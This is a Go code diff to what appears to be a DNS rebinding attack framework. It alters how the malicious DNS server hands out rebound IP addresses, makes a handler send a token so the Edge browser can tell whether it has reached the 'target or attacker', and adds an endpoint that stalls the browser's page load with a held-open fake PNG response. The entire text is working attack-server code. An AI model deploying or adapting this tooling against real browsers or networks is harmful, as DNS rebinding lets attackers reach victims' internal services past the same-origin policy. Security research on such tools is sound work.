@@ -164,7 +164,7 @@ func DNSRebindFromQueryFirstThenSecond(session string, dcss *DNSClientStateStore
 
 	if dnsCacheFlush == false { // This is not a request for cache eviction
 		if elapsed < (time.Second * time.Duration(timeOut)) {
-			answers = append(answers, dcss.Sessions[session].ResponseReboundIPAddr)
+			answers[0] = dcss.Sessions[session].ResponseReboundIPAddr
 		}
 	}
 	dcss.RUnlock()
@@ -184,7 +184,7 @@ func DNSRebindFromQueryRandom(session string, dcss *DNSClientStateStore, q dns.Q
 	log.Printf("In DNSRebindFromQueryRandom\n")
 
 	if dnsCacheFlush == false { // This is not a request for cache eviction
-		answers = append(answers, hosts[rand.Intn(len(hosts))])
+		answers[0] = hosts[rand.Intn(len(hosts))]
 	}
 
 	return answers
@@ -217,7 +217,7 @@ func DNSRebindFromQueryRoundRobin(session string, dcss *DNSClientStateStore, q d
 		dcss.Lock()
 		dcss.Sessions[session].LastResponseReboundIPAddr = LastResponseReboundIPAddr
 		dcss.Unlock()
-		answers = append(answers, (hosts[LastResponseReboundIPAddr]))
+		answers[0] = hosts[LastResponseReboundIPAddr]
 	}
 
 	return answers
@@ -506,15 +506,46 @@ func (ipt *IPTablesHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 
 	ipTablesRule.AddRule()
 
-	bufrw.WriteString("HTTP")
+	//Instead of writing the beginning of a valid HTTP response
+	// e.g. bufrw.WriteString("HTTP")
+	// that works with most browsers except Edge,
+	// we write the token value for Edge to determine whether it is connected to
+	// target or attacker. TODO make this value a startup parameter.
+	bufrw.WriteString("thisismytesttoken")
 	bufrw.Flush()
 
+}
+
+// DelayDOMLoadHandler is a HTTP handler that forces browsers
+// to wait for more data thus delaying DOM load event.
+type DelayDOMLoadHandler struct{}
+
+func (h *DelayDOMLoadHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
+	hj, ok := w.(http.Hijacker)
+	if !ok {
+		log.Printf("webserver doesn't support hijacking\n")
+		return
+	}
+	conn, bufrw, err := hj.Hijack()
+	if err != nil {
+		log.Printf("could not hijack http server connection: %v\n", err.Error())
+		return
+	}
+
+	defer conn.Close()
+
+	bufrw.WriteString("HTTP/1.1 200 OK\r\nAccept-Ranges: bytes\r\n" +
+		"Cache-Control: no-cache, no-store, must-revalidate\r\nContent-Length: 4\r\nContent-Type: image/png\r\n" +
+		"Expires: 0\r\nPragma: no-cache\r\nX-Dns-Prefetch-Control: off\r\nConnection: close\r\n\r\nPNG")
+	bufrw.Flush()
+	time.Sleep(10 * time.Second)
 }
 
 // NewHTTPServer configures a HTTP server
 func NewHTTPServer(port int, hss *HTTPServerStoreHandler, dcss *DNSClientStateStore) *http.Server {
 	d := &DefaultHeadersHandler{NextHandler: http.FileServer(http.Dir("./html"))}
 	ipth := &IPTablesHandler{}
+	delayDOMLoadHandler := &DelayDOMLoadHandler{}
 	h := http.NewServeMux()
 
 	h.HandleFunc("/", func(w http.ResponseWriter, req *http.Request) {
@@ -553,6 +584,7 @@ func NewHTTPServer(port int, hss *HTTPServerStoreHandler, dcss *DNSClientStateSt
 	})
 
 	h.Handle("/servers", hss)
+	h.Handle("/delaydomload", delayDOMLoadHandler)
 
 	httpServer := &http.Server{Addr: ":" + strconv.Itoa(port), Handler: h}
 
